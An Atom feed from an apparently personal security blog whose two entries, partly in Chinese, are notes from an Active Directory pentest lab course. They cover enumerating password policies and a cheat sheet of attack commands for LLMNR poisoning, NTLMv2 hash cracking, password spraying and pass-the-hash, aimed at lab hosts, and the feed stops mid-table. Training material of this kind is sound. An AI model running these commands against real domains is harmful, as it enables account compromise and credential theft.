<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Salve</title>
  
  
  <link href="https://taninluv.github.io/atom.xml" rel="self"/>
  
  <link href="https://taninluv.github.io/"/>
  <updated>2023-09-24T11:20:36.999Z</updated>
  <id>https://taninluv.github.io/</id>
  
  <author>
    <name>TiAmo</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>AD_2</title>
    <link href="https://taninluv.github.io/2023/09/24/AD-2/"/>
    <id>https://taninluv.github.io/2023/09/24/AD-2/</id>
    <published>2023-09-24T09:12:45.000Z</published>
    <updated>2023-09-24T11:20:36.999Z</updated>
    
    <content type="html"><![CDATA[<ul><li>Sighting In, Hunting For A User</li><li>Spray Responsibly</li></ul><span id="more"></span><h2 id="Enumerating-the-Password-Policy-from-Linux-Credentialed"><a href="#Enumerating-the-Password-Policy-from-Linux-Credentialed" class="headerlink" title="Enumerating the Password Policy - from Linux - Credentialed"></a>Enumerating the Password Policy - from Linux - Credentialed</h2><p>我们可以通过多种方式提取域密码策略，具体取决于域的配置方式以及我们是否具有有效的域凭据。使用有效的域凭据，还可以使用CrackMapExec或rpcclient等工具远程获取密码策略。</p><pre><code class="shell-session">Tanin@htb[/htb]$ crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-polSMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\avazquez:Password123 SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Dumping password info for domain: INLANEFREIGHTSMB         172.16.5.5      445    ACADEMY-EA-DC01  Minimum password length: 8SMB         172.16.5.5      445    ACADEMY-EA-DC01  Password history length: 24SMB         172.16.5.5      445    ACADEMY-EA-DC01  Maximum password age: Not SetSMB         172.16.5.5      445    ACADEMY-EA-DC01  SMB         172.16.5.5      445    ACADEMY-EA-DC01  Password Complexity Flags: 000001SMB         172.16.5.5      445    ACADEMY-EA-DC01  Domain Refuse Password Change: 0SMB         172.16.5.5      445    ACADEMY-EA-DC01  Domain Password Store Cleartext: 0SMB         172.16.5.5      445    ACADEMY-EA-DC01  Domain Password Lockout Admins: 0SMB         172.16.5.5      445    ACADEMY-EA-DC01  Domain Password No Clear Change: 0SMB         172.16.5.5      445    ACADEMY-EA-DC01  Domain Password No Anon Change: 0SMB         172.16.5.5      445    ACADEMY-EA-DC01  Domain Password Complex: 1SMB         172.16.5.5      445    ACADEMY-EA-DC01  SMB         172.16.5.5      445    ACADEMY-EA-DC01  Minimum password age: 1 day 4 minutes SMB         172.16.5.5      445    ACADEMY-EA-DC01  Reset Account Lockout Counter: 30 minutes SMB         172.16.5.5      445    ACADEMY-EA-DC01  Locked Account Duration: 30 minutes SMB         172.16.5.5      445    ACADEMY-EA-DC01  Account Lockout Threshold: 5SMB         172.16.5.5      445    ACADEMY-EA-DC01  Forced Log off Time: Not Set</code></pre><h2 id="Enumerating-the-Password-Policy-from-Linux-SMB-NULL-Sessions"><a href="#Enumerating-the-Password-Policy-from-Linux-SMB-NULL-Sessions" class="headerlink" title="Enumerating the Password Policy - from Linux - SMB NULL Sessions"></a>Enumerating the Password Policy - from Linux - SMB NULL Sessions</h2><blockquote><p>SMB NULL Sessions（SMB空会话）是指在Microsoft Windows网络中的SMB（Server Message Block）协议中，允许未经身份验证的访问网络共享资源的一种机制。这是一种安全性问题，因为未经身份验证的用户可以访问共享文件夹和其他资源，可能导致潜在的安全风险和信息泄露。</p></blockquote><p>如果&#x3D;&#x3D;没有凭据&#x3D;&#x3D;，我们可以通过SMB NULL会话或LDAP匿名绑定获取密码策略。第一种是通过SMB NULL会话。SMB NULL会话允许未经身份验证的攻击者从域中检索信息，例如用户、组、计算机、用户帐户属性和域密码策略的完整列表。SMB NULL会话配置错误通常是由于旧版域控制器升级到位，最终导致不安全的配置，而这些配置默认存在于旧版本的Windows Server中。 在早期版本的Windows Server中创建域时，会向某些共享授予匿名访问权限，从而允许域枚举。SMB NULL会话可以轻松枚举。对于枚举，我们可以使用enum4linux、CrackMapExec、rpcclient等工具。 我们可以使用rpcclient检查域控制器的SMB NULL会话访问。 连接后，我们可以发出一个RPC命令，如querydominfo，以获取有关域的信息并确认NULL会话访问。</p><h4 id="Using-rpcclient"><a href="#Using-rpcclient" class="headerlink" title="Using rpcclient"></a>Using rpcclient</h4><pre><code class="shell-session">Tanin@htb[/htb]$ rpcclient -U &quot;&quot; -N 172.16.5.5rpcclient $&gt; querydominfoDomain:INLANEFREIGHTServer:Comment:Total Users:3650Total Groups:0Total Aliases:37Sequence No:1Force Logoff:-1Domain Server State:0x1Server Role:ROLE_DOMAIN_PDCUnknown 3:0x1</code></pre><h4 id="Obtaining-the-Password-Policy-using-rpcclient"><a href="#Obtaining-the-Password-Policy-using-rpcclient" class="headerlink" title="Obtaining the Password Policy using rpcclient"></a>Obtaining the Password Policy using rpcclient</h4><pre><code class="shell-session">rpcclient $&gt; querydominfoDomain:INLANEFREIGHTServer:Comment:Total Users:3650Total Groups:0Total Aliases:37Sequence No:1Force Logoff:-1Domain Server State:0x1Server Role:ROLE_DOMAIN_PDCUnknown 3:0x1rpcclient $&gt; getdompwinfomin_password_length: 8password_properties: 0x00000001    DOMAIN_PASSWORD_COMPLEX</code></pre><h4 id="Using-enum4linux"><a href="#Using-enum4linux" class="headerlink" title="Using enum4linux"></a>Using enum4linux</h4><pre><code class="shell-session">Tanin@htb[/htb]$ enum4linux -P 172.16.5.5&lt;SNIP&gt; ================================================== |    Password Policy Information for 172.16.5.5    | ================================================== [+] Attaching to 172.16.5.5 using a NULL share[+] Trying protocol 139/SMB...    [!] Protocol failed: Cannot request session (Called Name:172.16.5.5)[+] Trying protocol 445/SMB...[+] Found domain(s):    [+] INLANEFREIGHT    [+] Builtin[+] Password Info for Domain: INLANEFREIGHT    [+] Minimum password length: 8    [+] Password history length: 24    [+] Maximum password age: Not Set    [+] Password Complexity Flags: 000001        [+] Domain Refuse Password Change: 0        [+] Domain Password Store Cleartext: 0        [+] Domain Password Lockout Admins: 0        [+] Domain Password No Clear Change: 0        [+] Domain Password No Anon Change: 0        [+] Domain Password Complex: 1    [+] Minimum password age: 1 day 4 minutes     [+] Reset Account Lockout Counter: 30 minutes     [+] Locked Account Duration: 30 minutes     [+] Account Lockout Threshold: 5    [+] Forced Log off Time: Not Set[+] Retieved partial password policy with rpcclient:Password Complexity: EnabledMinimum Password Length: 8enum4linux complete on Tue Feb 22 17:39:29 2022</code></pre><p>工具<a href="https://github.com/cddmp/enum4linux-ng">enum4linux-ng</a>是对Python中enum4linux的重写，但具有其他功能，如将数据导出为YAML或JSON文件的能力，这些文件稍后可用于进一步处理数据或将其提供给其他工具。除其他功能外，它还支持彩色输出</p><h4 id="Using-enum4linux-ng"><a href="#Using-enum4linux-ng" class="headerlink" title="Using enum4linux-ng"></a>Using enum4linux-ng</h4><pre><code class="shell-session">Tanin@htb[/htb]$ enum4linux-ng -P 172.16.5.5 -oA ilfreightENUM4LINUX - next generation&lt;SNIP&gt; =======================================|    RPC Session Check on 172.16.5.5    | =======================================[*] Check for null session[+] Server allows session using username &#39;&#39;, password &#39;&#39;[*] Check for random user session[-] Could not establish random user session: STATUS_LOGON_FAILURE =================================================|    Domain Information via RPC for 172.16.5.5    | =================================================[+] Domain: INLANEFREIGHT[+] SID: S-1-5-21-3842939050-3880317879-2865463114[+] Host is part of a domain (not a workgroup) =========================================================|    Domain Information via SMB session for 172.16.5.5    |========================================================[*] Enumerating via unauthenticated SMB session on 445/tcp[+] Found domain information via SMBNetBIOS computer name: ACADEMY-EA-DC01NetBIOS domain name: INLANEFREIGHTDNS domain: INLANEFREIGHT.LOCALFQDN: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL =======================================|    Policies via RPC for 172.16.5.5    | =======================================[*] Trying port 445/tcp[+] Found policy:domain_password_information:  pw_history_length: 24  min_pw_length: 8  min_pw_age: 1 day 4 minutes  max_pw_age: not set  pw_properties:  - DOMAIN_PASSWORD_COMPLEX: true  - DOMAIN_PASSWORD_NO_ANON_CHANGE: false  - DOMAIN_PASSWORD_NO_CLEAR_CHANGE: false  - DOMAIN_PASSWORD_LOCKOUT_ADMINS: false  - DOMAIN_PASSWORD_PASSWORD_STORE_CLEARTEXT: false  - DOMAIN_PASSWORD_REFUSE_PASSWORD_CHANGE: falsedomain_lockout_information:  lockout_observation_window: 30 minutes  lockout_duration: 30 minutes  lockout_threshold: 5domain_logoff_information:  force_logoff_time: not setCompleted after 5.41 seconds</code></pre><h4 id="Displaying-the-contents-of-ilfreight-json"><a href="#Displaying-the-contents-of-ilfreight-json" class="headerlink" title="Displaying the contents of ilfreight.json"></a>Displaying the contents of ilfreight.json</h4><pre><code class="shell-session">Tanin@htb[/htb]$ cat ilfreight.json &#123;    &quot;target&quot;: &#123;        &quot;host&quot;: &quot;172.16.5.5&quot;,        &quot;workgroup&quot;: &quot;&quot;    &#125;,    &quot;credentials&quot;: &#123;        &quot;user&quot;: &quot;&quot;,        &quot;password&quot;: &quot;&quot;,        &quot;random_user&quot;: &quot;yxditqpc&quot;    &#125;,    &quot;services&quot;: &#123;        &quot;SMB&quot;: &#123;            &quot;port&quot;: 445,            &quot;accessible&quot;: true        &#125;,        &quot;SMB over NetBIOS&quot;: &#123;            &quot;port&quot;: 139,            &quot;accessible&quot;: true        &#125;    &#125;,    &quot;smb_dialects&quot;: &#123;        &quot;SMB 1.0&quot;: false,        &quot;SMB 2.02&quot;: true,        &quot;SMB 2.1&quot;: true,        &quot;SMB 3.0&quot;: true,        &quot;SMB1 only&quot;: false,        &quot;Preferred dialect&quot;: &quot;SMB 3.0&quot;,        &quot;SMB signing required&quot;: true    &#125;,    &quot;sessions_possible&quot;: true,    &quot;null_session_possible&quot;: true,&lt;SNIP&gt;</code></pre><h2 id="Enumerating-Null-Session-from-Windows"><a href="#Enumerating-Null-Session-from-Windows" class="headerlink" title="Enumerating Null Session - from Windows"></a>Enumerating Null Session - from Windows</h2><p>从Windows进行这种类型的空会话攻击并不常见，但我们可以使用命令<code>net use \\host\ipc$“”/u:“”</code>从Windows机器建立一个空会话，并确认我们是否可以执行更多这种类型的攻击。</p><h4 id="Establish-a-null-session-from-windows"><a href="#Establish-a-null-session-from-windows" class="headerlink" title="Establish a null session from windows"></a>Establish a null session from windows</h4><pre><code class="cmd-session">C:\htb&gt; net use \\DC01\ipc$ &quot;&quot; /u:&quot;&quot;The command completed successfully.</code></pre><h2 id="Enumerating-the-Password-Policy-from-Linux-LDAP-Anonymous-Bind"><a href="#Enumerating-the-Password-Policy-from-Linux-LDAP-Anonymous-Bind" class="headerlink" title="Enumerating the Password Policy - from Linux - LDAP Anonymous Bind"></a>Enumerating the Password Policy - from Linux - LDAP Anonymous Bind</h2><p>LDAP匿名绑定允许未经身份验证的攻击者从域中检索信息，例如用户、组、计算机、用户帐户属性和域密码策略的完整列表。这是一种旧式配置，从Windows Server 2003开始，只有经过身份验证的用户才能启动LDAP请求。我们仍然不时看到这种配置，因为管理员可能需要设置一个特定的应用程序来允许匿名绑定，并提供超过预期数量的访问权限，从而允许未经身份验证的用户访问AD中的所有对象。 使用LDAP匿名绑定，我们可以使用特定于LDAP的枚举工具，如windapsearch.py、ldapsearch、ad-ldapdomaindump.py等，来提取密码策略。使用 <a href="https://linux.die.net/man/1/ldapsearch">ldapsearch</a>，它可能有点麻烦，但可行。获取密码策略的一个示例命令如下：</p><h4 id="Using-ldapsearch"><a href="#Using-ldapsearch" class="headerlink" title="Using ldapsearch"></a>Using ldapsearch</h4><pre><code class="shell-session">Tanin@htb[/htb]$ ldapsearch -h 172.16.5.5 -x -b &quot;DC=INLANEFREIGHT,DC=LOCAL&quot; -s sub &quot;*&quot; | grep -m 1 -B 10 pwdHistoryLengthforceLogoff: -9223372036854775808lockoutDuration: -18000000000lockOutObservationWindow: -18000000000lockoutThreshold: 5maxPwdAge: -9223372036854775808minPwdAge: -864000000000minPwdLength: 8modifiedCountAtLastProm: 0nextRid: 1002pwdProperties: 1pwdHistoryLength: 24</code></pre><p>在这里，我们可以看到最小密码长度为8，锁定阈值为5，并且设置了密码复杂性（pwdProperties设置为1）。</p><h2 id="Enumerating-the-Password-Policy-from-Windows"><a href="#Enumerating-the-Password-Policy-from-Windows" class="headerlink" title="Enumerating the Password Policy - from Windows"></a>Enumerating the Password Policy - from Windows</h2><p>如果我们可以从Windows主机向域进行身份验证，我们可以使用内置的Windows二进制文件（如net.exe）来检索密码策略。我们还可以使用各种工具，如PowerView、CrackMapExec移植到Windows、SharpMapExec、SharpView等。 如果我们降落在Windows系统上，无法将工具传输到该系统，或者客户端将我们定位在Windows系统中，但无法将工具转移到该系统上，则使用内置命令会很有帮助。使用内置net.exe二进制文件的一个示例是：</p><pre><code class="cmd-session">C:\htb&gt; net accountsForce user logoff how long after time expires?:       NeverMinimum password age (days):                          1Maximum password age (days):                          UnlimitedMinimum password length:                              8Length of password history maintained:                24Lockout threshold:                                    5Lockout duration (minutes):                           30Lockout observation window (minutes):                 30Computer role:                                        SERVER</code></pre><p>在这里，我们可以收集以下信息： 密码永不过期（密码最长使用期限设置为无限制） 最小密码长度为8，因此可能使用弱密码 锁定阈值为5个错误密码 帐户被锁定30分钟</p><p>此密码策略非常适合密码喷洒。八个字符的最小值意味着我们可以尝试常见的弱密码，如Welcome1。5的锁定阈值意味着我们可以每31分钟尝试2-3次（为了安全）喷雾，而没有锁定任何账户的风险。如果一个帐户被锁定，它将在30分钟后自动解锁（无需管理员手动干预），但我们应该避免不惜一切代价锁定任何帐户。 PowerView在这方面也很方便：</p><h4 id="Using-PowerView"><a href="#Using-PowerView" class="headerlink" title="Using PowerView"></a>Using PowerView</h4><pre><code class="powershell-session">PS C:\htb&gt; import-module .\PowerView.ps1PS C:\htb&gt; Get-DomainPolicyUnicode        : @&#123;Unicode=yes&#125;SystemAccess   : @&#123;MinimumPasswordAge=1; MaximumPasswordAge=-1; MinimumPasswordLength=8; PasswordComplexity=1;                 PasswordHistorySize=24; LockoutBadCount=5; ResetLockoutCount=30; LockoutDuration=30;                 RequireLogonToChangePassword=0; ForceLogoffWhenHourExpire=0; ClearTextPassword=0;                 LSAAnonymousNameLookup=0&#125;KerberosPolicy : @&#123;MaxTicketAge=10; MaxRenewAge=7; MaxServiceAge=600; MaxClockSkew=5; TicketValidateClient=1&#125;Version        : @&#123;signature=&quot;$CHICAGO$&quot;; Revision=1&#125;RegistryValues : @&#123;MACHINE\System\CurrentControlSet\Control\Lsa\NoLMHash=System.Object[]&#125;Path           : \\INLANEFREIGHT.LOCAL\sysvol\INLANEFREIGHT.LOCAL\Policies\&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;\MACHI                 NE\Microsoft\Windows NT\SecEdit\GptTmpl.infGPOName        : &#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;GPODisplayName : Default Domain Policy</code></pre><p>PowerView为我们提供了与net accounts命令相同的输出，只是格式不同，但也显示密码复杂性已启用（PasswordComplexity&#x3D;1）。 与Linux一样，我们有许多工具可以在Windows系统上检索密码策略，无论是我们的攻击系统还是客户端提供的系统。PowerView&#x2F;SharpView总是不错的选择，CrackMapExec、SharpMapExec等也是如此。工具的选择取决于评估目标、隐形注意事项、任何防病毒或EDR以及对目标主机的其他潜在限制。让我们介绍几个例子。</p><h2 id="Analyzing-the-Password-Policy"><a href="#Analyzing-the-Password-Policy" class="headerlink" title="Analyzing the Password Policy"></a>Analyzing the Password Policy</h2><p>我们现在已经通过多种方式取消了密码策略。让我们逐一了解INLANEFREIGHT.LOCAL域的策略。</p><ul><li>最小密码长度为8（8很常见，但如今，我们看到越来越多的组织强制使用10-14个字符的密码，这可以为我们删除一些密码选项，但并不能完全缓解密码喷洒矢量）</li><li>帐户锁定阈值为5（通常会看到较低的阈值，如3，甚至根本没有设置锁定阈值）</li><li>锁定持续时间为30分钟（根据组织的不同，这可能会更高或更低），因此，如果我们意外锁定（避免！！）帐户，它将在30分钟窗口过后解锁</li><li>帐户自动解锁（在某些组织中，管理员必须手动解锁帐户）。我们从不想在执行密码喷洒时锁定帐户，但我们特别希望避免在管理员必须手动&#x2F;脚本干预并解锁数百（或数千）个帐户的组织中锁定帐户</li><li>启用了密码复杂性，这意味着用户必须选择包含以下内容的3&#x2F;4的密码：大写字母、小写字母、数字、特殊字符（Password1或Welcome1可以满足此处的“复杂性”要求，但显然仍然是弱密码）。</li></ul><h1 id="default-password-policy"><a href="#default-password-policy" class="headerlink" title="default password policy*"></a>default password policy*</h1><p>创建新域时的默认密码策略如下，许多组织从未更改过此策略：</p><table><thead><tr><th>Policy</th><th>Default Value</th></tr></thead><tbody><tr><td>Enforce password history</td><td>24 days</td></tr><tr><td>Maximum password age</td><td>42 days</td></tr><tr><td>Minimum password age</td><td>1 day</td></tr><tr><td>Minimum password length</td><td>7</td></tr><tr><td>Password must meet complexity requirements</td><td>Enabled</td></tr><tr><td>Store passwords using reversible encryption</td><td>Disabled</td></tr><tr><td>Account lockout duration</td><td>Not set</td></tr><tr><td>Account lockout threshold</td><td>0</td></tr><tr><td>Reset account lockout counter after</td><td>Not set</td></tr></tbody></table><hr>]]></content>
    
    
    <summary type="html">&lt;ul&gt;
&lt;li&gt;Sighting In, Hunting For A User&lt;/li&gt;
&lt;li&gt;Spray Responsibly&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    
    <category term="base" scheme="https://taninluv.github.io/tags/base/"/>
    
    <category term="AD" scheme="https://taninluv.github.io/tags/AD/"/>
    
  </entry>
  
  <entry>
    <title>AD_Cheat_Sheet</title>
    <link href="https://taninluv.github.io/2023/09/23/AD-Cheat-Sheet/"/>
    <id>https://taninluv.github.io/2023/09/23/AD-Cheat-Sheet/</id>
    <published>2023-09-23T04:19:05.000Z</published>
    <updated>2023-09-23T04:20:10.139Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Initial-Enumeration"><a href="#Initial-Enumeration" class="headerlink" title="Initial Enumeration"></a>Initial Enumeration</h1><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>nslookup ns1.inlanefreight.com</code></td><td>Used to query the domain name system and discover the IP address to domain name mapping of the target entered from a Linux-based host.</td></tr><tr><td><code>sudo tcpdump -i ens224</code></td><td>Used to start capturing network packets on the network interface proceeding the <code>-i</code> option a Linux-based host.</td></tr><tr><td><code>sudo responder -I ens224 -A</code></td><td>Used to start responding to &amp; analyzing <code>LLMNR</code>, <code>NBT-NS</code> and <code>MDNS</code> queries on the interface specified proceeding the<code> -I</code> option and operating in <code>Passive Analysis</code> mode which is activated using <code>-A</code>. Performed from a Linux-based host</td></tr><tr><td><code>fping -asgq 172.16.5.0/23</code></td><td>Performs a ping sweep on the specified network segment from a Linux-based host.</td></tr><tr><td><code>sudo nmap -v -A -iL hosts.txt -oN /home/User/Documents/host-enum</code></td><td>Performs an nmap scan that with OS detection, version detection, script scanning, and traceroute enabled (<code>-A</code>) based on a list of hosts (<code>hosts.txt</code>) specified in the file proceeding <code>-iL</code>. Then outputs the scan results to the file specified after the <code>-oN</code>option. Performed from a Linux-based host</td></tr><tr><td><code>sudo git clone https://github.com/ropnop/kerbrute.git</code></td><td>Uses <code>git</code> to clone the kerbrute tool from a Linux-based host.</td></tr><tr><td><code>make help</code></td><td>Used to list compiling options that are possible with <code>make</code> from a Linux-based host.</td></tr><tr><td><code>sudo make all</code></td><td>Used to compile a <code>Kerbrute</code> binary for multiple OS platforms and CPU architectures.</td></tr><tr><td><code>./kerbrute_linux_amd64</code></td><td>Used to test the chosen complied <code>Kebrute</code> binary from a Linux-based host.</td></tr><tr><td><code>sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute</code></td><td>Used to move the <code>Kerbrute</code> binary to a directory can be set to be in a Linux user’s path. Making it easier to use the tool.</td></tr><tr><td><code>./kerbrute_linux_amd64 userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o kerb-results</code></td><td>Runs the Kerbrute tool to discover usernames in the domain (<code>INLANEFREIGHT.LOCAL</code>) specified proceeding the <code>-d</code> option and the associated domain controller specified proceeding <code>--dc</code>using a wordlist and outputs (<code>-o</code>) the results to a specified file. Performed from a Linux-based host.</td></tr></tbody></table><h1 id="LLMNR-x2F-NTB-NS-Poisoning"><a href="#LLMNR-x2F-NTB-NS-Poisoning" class="headerlink" title="LLMNR&#x2F;NTB-NS Poisoning"></a>LLMNR&#x2F;NTB-NS Poisoning</h1><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>responder -h</code></td><td>Used to display the usage instructions and various options available in <code>Responder</code> from a Linux-based host.</td></tr><tr><td><code>hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt</code></td><td>Uses <code>hashcat</code> to crack <code>NTLMv2</code> (<code>-m</code>) hashes that were captured by responder and saved in a file (<code>frond_ntlmv2</code>). The cracking is done based on a specified wordlist.</td></tr><tr><td><code>Import-Module .\Inveigh.ps1</code></td><td>Using the <code>Import-Module</code> PowerShell cmd-let to import the Windows-based tool <code>Inveigh.ps1</code>.</td></tr><tr><td><code>(Get-Command Invoke-Inveigh).Parameters</code></td><td>Used to output many of the options &amp; functionality available with <code>Invoke-Inveigh</code>. Peformed from a Windows-based host.</td></tr><tr><td><code>Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y</code></td><td>Starts <code>Inveigh</code> on a Windows-based host with LLMNR &amp; NBNS spoofing enabled and outputs the results to a file.</td></tr><tr><td><code>.\Inveigh.exe</code></td><td>Starts the <code>C#</code> implementation of <code>Inveigh</code> from a Windows-based host.</td></tr><tr><td><code>$regkey = &quot;HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces&quot; Get-ChildItem $regkey |foreach &#123; Set-ItemProperty -Path &quot;$regkey\$($_.pschildname)&quot; -Name NetbiosOptions -Value 2 -Verbose&#125;</code></td><td>PowerShell script used to disable NBT-NS on a Windows host.</td></tr></tbody></table><h1 id="Password-Spraying-amp-Password-Policies"><a href="#Password-Spraying-amp-Password-Policies" class="headerlink" title="Password Spraying &amp; Password Policies"></a>Password Spraying &amp; Password Policies</h1><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>#!/bin/bash  for x in &#123;&#123;A..Z&#125;,&#123;0..9&#125;&#125;&#123;&#123;A..Z&#125;,&#123;0..9&#125;&#125;&#123;&#123;A..Z&#125;,&#123;0..9&#125;&#125;&#123;&#123;A..Z&#125;,&#123;0..9&#125;&#125;     do echo $x; done</code></td><td>Bash script used to generate <code>16,079,616</code> possible username combinations from a Linux-based host.</td></tr><tr><td><code>crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol</code></td><td>Uses <code>CrackMapExec</code>and valid credentials (<code>avazquez:Password123</code>) to enumerate the password policy (<code>--pass-pol</code>) from a Linux-based host.</td></tr><tr><td><code>rpcclient -U &quot;&quot; -N 172.16.5.5</code></td><td>Uses <code>rpcclient</code> to discover information about the domain through <code>SMB NULL</code> sessions. Performed from a Linux-based host.</td></tr><tr><td><code>rpcclient $&gt; querydominfo</code></td><td>Uses <code>rpcclient</code> to enumerate the password policy in a target Windows domain from a Linux-based host.</td></tr><tr><td><code>enum4linux  -P 172.16.5.5</code></td><td>Uses <code>enum4linux</code> to enumerate the password policy (<code>-P</code>) in a target Windows domain from a Linux-based host.</td></tr><tr><td><code>enum4linux-ng -P 172.16.5.5 -oA ilfreight</code></td><td>Uses <code>enum4linux-ng</code> to enumerate the password policy (<code>-P</code>) in a target Windows domain from a Linux-based host, then presents the output in YAML &amp; JSON saved in a file proceeding the <code>-oA</code> option.</td></tr><tr><td><code>ldapsearch -h 172.16.5.5 -x -b &quot;DC=INLANEFREIGHT,DC=LOCAL&quot; -s sub &quot;*&quot; | grep -m 1 -B 10 pwdHistoryLength</code></td><td>Uses <code>ldapsearch</code> to enumerate the password policy in a  target Windows domain from a Linux-based host.</td></tr><tr><td><code>net accounts</code></td><td>Used to enumerate the password policy in a Windows domain from a Windows-based host.</td></tr><tr><td><code>Import-Module .\PowerView.ps1</code></td><td>Uses the Import-Module cmd-let to import the <code>PowerView.ps1</code> tool from a Windows-based host.</td></tr><tr><td><code>Get-DomainPolicy</code></td><td>Used to enumerate the password policy in a target Windows domain from a Windows-based host.</td></tr><tr><td><code>enum4linux -U 172.16.5.5  | grep &quot;user:&quot; | cut -f2 -d&quot;[&quot; | cut -f1 -d&quot;]&quot;</code></td><td>Uses <code>enum4linux</code> to discover user accounts in a target Windows domain, then leverages <code>grep</code> to filter the output to just display the user from a Linux-based host.</td></tr><tr><td><code>rpcclient -U &quot;&quot; -N 172.16.5.5  rpcclient $&gt; enumdomuser</code></td><td>Uses rpcclient to discover user accounts in a target Windows domain from a Linux-based host.</td></tr><tr><td><code>crackmapexec smb 172.16.5.5 --users</code></td><td>Uses <code>CrackMapExec</code> to discover users (<code>--users</code>) in a target Windows domain from a Linux-based host.</td></tr><tr><td><code>ldapsearch -h 172.16.5.5 -x -b &quot;DC=INLANEFREIGHT,DC=LOCAL&quot; -s sub &quot;(&amp;(objectclass=user))&quot;  | grep sAMAccountName: | cut -f2 -d&quot; &quot;</code></td><td>Uses <code>ldapsearch</code> to discover users in a target Windows doman, then filters the output using <code>grep</code> to show only the <code>sAMAccountName</code> from a Linux-based host.</td></tr><tr><td><code>./windapsearch.py --dc-ip 172.16.5.5 -u &quot;&quot; -U</code></td><td>Uses the python tool <code>windapsearch.py</code> to discover users in a target Windows domain from a Linux-based host.</td></tr><tr><td><code>for u in $(cat valid_users.txt);do rpcclient -U &quot;$u%Welcome1&quot; -c &quot;getusername;quit&quot; 172.16.5.5 | grep Authority; done</code></td><td>Bash one-liner used to perform a password spraying attack using <code>rpcclient</code> and a list of users (<code>valid_users.txt</code>) from a Linux-based host. It also filters out failed attempts to make the output cleaner.</td></tr><tr><td><code>kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1</code></td><td>Uses <code>kerbrute</code> and a list of users (<code>valid_users.txt</code>) to perform a password spraying attack against a target Windows domain from a Linux-based host.</td></tr><tr><td><code>sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +</code></td><td>Uses <code>CrackMapExec</code> and a list of users (<code>valid_users.txt</code>) to perform a password spraying attack against a target Windows domain from a Linux-based host. It also filters out logon failures using <code>grep</code>.</td></tr><tr><td><code> sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123</code></td><td>Uses <code>CrackMapExec</code> to validate a set of credentials from a Linux-based host.</td></tr><tr><td><code>sudo crackmapexec smb --local-auth 172.16.5.0/24 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +</code></td><td>Uses <code>CrackMapExec</code> and the -<code>-local-auth</code> flag to ensure only one login attempt is performed from a Linux-based host. This is to ensure accounts are not locked out by enforced password policies. It also filters out logon failures using <code>grep</code>.</td></tr><tr><td><code>Import-Module .\DomainPasswordSpray.ps1</code></td><td>Used to import the PowerShell-based tool <code>DomainPasswordSpray.ps1</code> from a Windows-based host.</td></tr><tr><td><code>Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue</code></td><td>Performs a password spraying attack and outputs (-OutFile) the results to a specified file (<code>spray_success</code>) from a Windows-based host.</td></tr></tbody></table><h1 id="Enumerating-Security-Controls"><a href="#Enumerating-Security-Controls" class="headerlink" title="Enumerating Security Controls"></a>Enumerating Security Controls</h1><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>Get-MpComputerStatus</code></td><td>PowerShell cmd-let used to check the status of <code>Windows Defender Anti-Virus</code> from a Windows-based host.</td></tr><tr><td><code>Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections</code></td><td>PowerShell cmd-let used to view <code>AppLocker</code> policies from a Windows-based host.</td></tr><tr><td><code>$ExecutionContext.SessionState.LanguageMode</code></td><td>PowerShell script used to discover the <code>PowerShell Language Mode</code> being used on a Windows-based host. Performed from a Windows-based host.</td></tr><tr><td><code>Find-LAPSDelegatedGroups</code></td><td>A <code>LAPSToolkit</code> function that discovers <code>LAPS Delegated Groups</code> from a Windows-based host.</td></tr><tr><td><code>Find-AdmPwdExtendedRights</code></td><td>A <code>LAPSTookit</code> function that checks the rights on each computer with LAPS enabled for any groups with read access and users with <code>All Extended Rights</code>. Performed from a Windows-based host.</td></tr><tr><td><code>Get-LAPSComputers</code></td><td>A <code>LAPSToolkit</code> function that searches for computers that have LAPS enabled, discover password expiration and can discover randomized passwords. Performed from a Windows-based host.</td></tr></tbody></table><h1 id="Credentialed-Enumeration"><a href="#Credentialed-Enumeration" class="headerlink" title="Credentialed Enumeration"></a>Credentialed Enumeration</h1><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>xfreerdp /u:forend@inlanefreight.local /p:Klmcargo2 /v:172.16.5.25</code></td><td>Connects to a Windows target using valid credentials. Performed from a Linux-based host.</td></tr><tr><td><code>sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users</code></td><td>Authenticates with a Windows target over <code>smb</code> using valid credentials and attempts to discover more users (<code>--users</code>) in a target Windows domain. Performed from a Linux-based host.</td></tr><tr><td><code>sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups</code></td><td>Authenticates with a Windows target over <code>smb</code> using valid credentials and attempts to discover groups (<code>--groups</code>) in a target Windows domain. Performed from a Linux-based host.</td></tr><tr><td><code>sudo crackmapexec smb 172.16.5.125 -u 